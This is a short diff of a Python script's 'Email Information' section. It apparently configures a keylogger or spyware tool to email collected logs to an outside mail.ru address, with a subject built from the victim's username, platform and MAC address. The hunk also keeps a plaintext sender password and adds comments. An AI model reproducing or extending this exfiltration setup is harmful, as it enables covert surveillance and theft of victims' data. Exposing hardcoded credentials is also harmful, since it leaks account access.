@@ -38,9 +38,14 @@ Log = list()
 
 # ################ Email Information
 
-email = 'mustafajawad444@gmail.com'
+#sender email and password
+email = ''
 password = '8mustafa8'
+
+#resever email
 resever = 'sajjad.jawad.alkhafaji@mail.ru'
+
+#setup subject and the message to be sent
 subject = "[{0}] - [{1}] - [{2}]".format(getuser(), sys.platform, MACaddress())
 message = ""
 
